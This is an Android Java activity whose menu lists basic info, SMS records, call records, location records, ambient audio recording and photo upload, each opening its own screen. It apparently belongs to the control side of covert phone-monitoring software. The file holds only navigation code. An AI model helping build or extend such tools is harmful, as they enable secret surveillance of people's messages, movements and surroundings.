package com.android.smsserver;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.Button;
import android.widget.ListView;

import com.android.adapter.MoreAdapter;
import com.android.utils.Utils;

public class InfoActivity extends Activity {

	private ListenerImpl listener;
	private List<String> ls=new ArrayList<String>();
	private ListView infodata;
	private MoreAdapter mordadapter;
	private Button setbut;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_set);
		listener=new ListenerImpl();
		infodata=(ListView)findViewById(R.id.infodata);
		setbut=(Button)findViewById(R.id.setbut);
		mordadapter=new MoreAdapter(this, ls,Utils.client);
		infodata.setAdapter(mordadapter);
		infodata.setOnItemClickListener(listener);
		init();
		setbut.setOnClickListener(listener);
	}
	private void init(){
		ls.clear();
		ls.add("基本信息");
		ls.add("短信记录");
		ls.add("通话记录");
		ls.add("位置记录");
		ls.add("环境录音");
		ls.add("拍照上传");
		mordadapter.notifyDataSetChanged();
	}
	class ListenerImpl implements OnItemClickListener,OnClickListener{


		@Override
		public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
				long arg3) {
			// TODO Auto-generated method stub
			String ac=ls.get(arg2);
			if("基本信息".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,BaseInfoActivity.class);
				startActivity(intent);
			}
			if("短信记录".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,SmsActivity.class);
				startActivity(intent);
			}
			if("通话记录".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,CallActivity.class);
				startActivity(intent);
			}
			if("位置记录".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,LocActivity.class);
				startActivity(intent);
			}
			if("环境录音".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,RecordActivity.class);
				startActivity(intent);
			}
			if("拍照上传".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,PhotoActivity.class);
				startActivity(intent);
			}
		}

		@Override
		public void onClick(View arg0) {
			// TODO Auto-generated method stub
			
		}


		
	}
	


}
